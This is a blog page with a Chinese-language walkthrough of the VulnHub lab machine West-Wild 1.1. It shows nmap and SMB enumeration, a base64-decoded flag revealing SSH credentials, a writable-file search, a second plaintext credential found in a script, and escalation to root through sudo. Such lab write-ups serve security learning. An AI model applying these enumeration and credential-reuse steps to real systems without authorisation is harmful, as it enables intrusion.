<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>【VulnHub系列】West-Wlid1.1 - IT学习者博客</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="【VulnHub系列】West-Wlid1.1" />
<meta property="og:description" content="实验信息 Kali：192.168.10.106
WestWild：192.168.104
实验过程 通过arp-scan查找目标主机，确定目标主机IP192.168.10.104
sudo arp-scan --interface eth0 192.168.10.0/24 探测靶机开放的端口
sudo nmap -sT --min-rate 10000 -p- 192.168.10.104 -oA nmap/result 对刚刚扫出来的端口进行详细的扫描&#43;脚本扫描
sudo nmap -sT -sC -sV -O -p22,80,139,445 192.168.10.104 -oA nmap/detail sudo nmap --script=vuln -p 22,80,139,445 192.168.10.104 -oA nmap/vuln 同时也进行UDP扫描，万一TCP端口没有进展可以尝试UDP端口
sudo nmap -sU --top-ports 20 192.168.10.104 -oA nmap/udp 先从80端口开始
尝试下常见的文件，并没有存在
http://192.168.10.106/readme.txt http://192.168.10.106/robots.txt 用gobuster来爆破
网页源码什么都没什么有用信息，网页上有一张图片下载来看有没有隐写一些信息
80端口没有什么可用信息，只能转头试试看smb服务
sudo smbmap -H 192.168.10.104 wave目录是可读的，看看有没有可用的信息
sudo smbmap -H 192.168.10.104 prompt get message_from_aveng.txt get message_from_aveng.txt exit FLAG1." />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://itnewbiea.github.io/posts/9d63913813068a68e0c2e70fbf387d8e/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2023-07-02T08:27:24+08:00" />
<meta property="article:modified_time" content="2023-07-02T08:27:24+08:00" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="IT学习者博客" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">IT学习者博客</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main" role="main">
	<article class="post">
		<header class="post__header">
			<h1 class="post__title">【VulnHub系列】West-Wlid1.1</h1>
			
		</header>
		<div class="content post__content clearfix">
			
<div id="content_views" class="htmledit_views">
                    <h2 style="margin-left:5pt;"><span style="color:#24292e;">实验信息</span></h2> 
<p style="margin-left:0;"></p> 
<p style="margin-left:0;"><span style="color:#24292e;">Kali：192.168.10.106</span></p> 
<p style="margin-left:0;"><span style="color:#24292e;">WestWild：192.168.104</span></p> 
<h2 style="margin-left:5pt;"><span style="color:#24292e;">实验过程</span></h2> 
<p style="margin-left:0;"></p> 
<p style="margin-left:0;"><span style="color:#24292e;">通过arp-scan查找目标主机，确定目标主机IP192.168.10.104</span></p> 
<pre><code class="hljs">sudo arp-scan --interface eth0 192.168.10.0/24</code></pre> 
<p><img alt="" height="392" src="https://images2.imgbox.com/c3/3e/s2K7E51k_o.png" width="1055"> </p> 
<p> <span style="color:#24292e;">探测靶机开放的端口</span></p> 
<pre><code class="hljs">sudo nmap -sT --min-rate 10000 -p- 192.168.10.104 -oA nmap/result</code></pre> 
<p><img alt="" height="445" src="https://images2.imgbox.com/40/cb/9DvJbtqT_o.png" width="1052"></p> 
<p> <span style="color:#24292e;">对刚刚扫出来的端口进行详细的扫描+脚本扫描</span></p> 
<pre><code class="hljs">sudo nmap -sT -sC -sV -O -p22,80,139,445 192.168.10.104 -oA nmap/detail 
sudo nmap --script=vuln -p 22,80,139,445 192.168.10.104 -oA nmap/vuln</code></pre> 
<p><img alt="" height="485" src="https://images2.imgbox.com/d4/a2/KOdrSvhs_o.png" width="1067"></p> 
<p> <span style="color:#24292e;">同时也进行UDP扫描，万一</span><span style="color:#24292e;">TCP</span><span style="color:#24292e;">端口没有进展可以尝试UDP端口</span></p> 
<pre><code class="hljs">sudo nmap -sU --top-ports 20 192.168.10.104 -oA nmap/udp</code></pre> 
<p><img alt="" height="705" src="https://images2.imgbox.com/69/11/e8AwOB0K_o.png" width="958"></p> 
<p> <span style="color:#24292e;">先从80端口开始</span></p> 
<p><img alt="" height="430" src="https://images2.imgbox.com/c5/dc/MEhBYzXO_o.png" width="1064"></p> 
<p> </p> 
<p><span style="color:#24292e;">尝试下常见的文件，并没有存在</span></p> 
<pre><code class="hljs">http://192.168.10.106/readme.txt 
http://192.168.10.106/robots.txt</code></pre> 
<p><span style="color:#24292e;">用gobuster</span><span style="color:#24292e;">来爆破</span></p> 
<p><img alt="" height="485" src="https://images2.imgbox.com/81/05/evAMCOcd_o.png" width="1067"></p> 
<p> </p> 
<p><span style="color:#24292e;">网页源码什么都没什么有用信息，网页上有一张图片下载来看有没有隐写一些信息</span></p> 
<p></p> 
<p><img alt="" height="518" src="https://images2.imgbox.com/85/b0/Q4gvD7vz_o.png" width="1060"></p> 
<p> <img alt="" height="630" src="https://images2.imgbox.com/e7/4c/ZzobWnns_o.png" width="1057"></p> 
<p> <span style="color:#24292e;">80</span><span style="color:#24292e;">端口没有什么可用信息，只能转头试试看smb服务</span></p> 
<p><img alt="" height="194" src="https://images2.imgbox.com/be/38/B4ySAn8p_o.png" width="1054"></p> 
<p> </p> 
<pre><code class="hljs">sudo smbmap -H 192.168.10.104</code></pre> 
<p><span style="color:#24292e;">wave</span><span style="color:#24292e;">目录是可读的，看看有没有可用的信息</span></p> 
<pre><code class="hljs">sudo smbmap -H 192.168.10.104 
prompt
get message_from_aveng.txt 
get message_from_aveng.txt 
exit
</code></pre> 
<p><img alt="" height="942" src="https://images2.imgbox.com/80/bb/Ij0l8UZG_o.png" width="1064"></p> 
<p> </p> 
<p style="margin-left:0;"><span style="color:#24292e;">FLAG1.txt</span><span style="color:#24292e;">的内容像是Base64编码后的内容，尝试解码</span></p> 
<p style="margin-left:0;"></p> 
<pre><code class="hljs">echo  RmxhZzF7V2VsY29tZV9UMF9USEUtVzNTVC1XMUxELUIwcmRlcn0KdXNlcjp3YXZleApwYXNzd29yZDpkb29yK29wZW4K
| base64 -d
</code></pre> 
<p style="margin-left:0;"><span style="color:#24292e;">得到凭据，SSH连接上靶机</span></p> 
<pre><code class="hljs">ssh wavex@192.168.10.104</code></pre> 
<p style="margin-left:0;"><span style="color:#24292e;">进行常规的信息收集</span></p> 
<p> <img alt="" height="1200" src="https://images2.imgbox.com/39/7b/5F9DGCkw_o.png" width="1033"></p> 
<p> </p> 
<pre><code class="hljs">! -path '/proc/*'：将/proc/*路径排除2&gt;/dev/null：将错误信息重定向到黑洞

find / -writable -type f ! -path '/proc/*' 2&gt;/dev/null
</code></pre> 
<p></p> 
<p style="margin-left:0;"><span style="color:#24292e;">发现一个</span><span style="color:#24292e;">ififoregt.sh</span><span style="color:#24292e;">文件</span></p> 
<p style="margin-left:0;"><img alt="" height="459" src="https://images2.imgbox.com/9b/97/l9B4Srci_o.png" width="1016"></p> 
<p> </p> 
<p style="margin-left:0;"><span style="color:#24292e;">查看内容发现另一个凭据</span></p> 
<p style="margin-left:0;"><img alt="" height="248" src="https://images2.imgbox.com/d2/f1/mzT89uNy_o.png" width="1021"></p> 
<p> </p> 
<pre><code class="hljs">figlet是一个用于生成字符艺术的命令行工具。它可以将普通文本转换成具有装饰效果的字符画，并支持多种字体和输出 格式。

#!/bin/bash
figlet "if i foregt so this my way" echo "user:aveng"
echo "password:kaizen+80"
</code></pre> 
<p style="margin-left:0;"><span style="color:#24292e;">切换到</span><span style="color:#24292e;">aveng</span><span style="color:#24292e;">账号发现其sudo拥有全部权限，可以直接拿下</span></p> 
<p style="margin-left:0;"><img alt="" height="200" src="https://images2.imgbox.com/94/10/ZCtHXMNH_o.png" width="1060"></p> 
<p> </p> 
<p style="margin-left:0;"></p> 
<p></p> 
<div id="trans_main"></div>
                </div>
		</div>
	</article>
</main>


<nav class="pager flex">
	<div class="pager__item pager__item--prev">
		<a class="pager__link" href="/posts/ca263e3bc774f33f425e9dfce3ddc615/" rel="prev">
			<span class="pager__subtitle">«&thinsp;Previous</span>
			<p class="pager__title">QTextEdit设置显示的最大行数</p>
		</a>
	</div>
	<div class="pager__item pager__item--next">
		<a class="pager__link" href="/posts/f76dda19d0d63b2e6008ec50108d2a1d/" rel="next">
			<span class="pager__subtitle">Next&thinsp;»</span>
			<p class="pager__title">牛客：扫雷</p>
		</a>
	</div>
</nav>


			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 IT学习者博客.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<script src="https://itnewbiea.github.io/js/foot.js"></script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>